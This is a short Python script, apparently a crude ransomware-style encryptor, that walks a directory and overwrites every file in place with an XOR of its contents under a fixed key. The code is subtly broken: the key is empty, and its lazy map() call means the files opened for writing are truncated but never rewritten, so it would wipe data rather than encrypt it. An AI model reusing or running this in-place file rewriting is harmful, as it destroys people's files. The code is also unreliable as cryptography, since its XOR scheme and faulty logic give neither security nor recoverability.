import os.path

rep = "test"
key = "".encode()
sizeKey = len(key)

def chunkString(string,key,length):
    return (list(string[0+i:length+i] for i in range(0, len(string), length)))

def addMissingBytesInList(L,sizeKey):
    for i, item in enumerate(L):
        if(len(item)<sizeKey):
            for _ in range(sizeKey-len(item)):
                L[i] += (" ").encode()
    return L

def byte_xor(b):
    return bytes([_a ^ _b for _a, _b in zip(b, key)])

def concatList(L):
    concated = bytes()
    for e in L:
        concated += e
    return concated

for root, dirs, files in os.walk(rep, topdown=False):
   for name in files:
        link = os.path.join(root, name)
        sizeFile = os.path.getsize(link)
        with open(link,"rb") as f:
            content = f.read()
            content = chunkString(content,key,sizeKey)
            cryptedContent = list(map(byte_xor,content))
        f.close()
        with open(link,"wb") as f:
            map(f.write,cryptedContent)
        f.close()
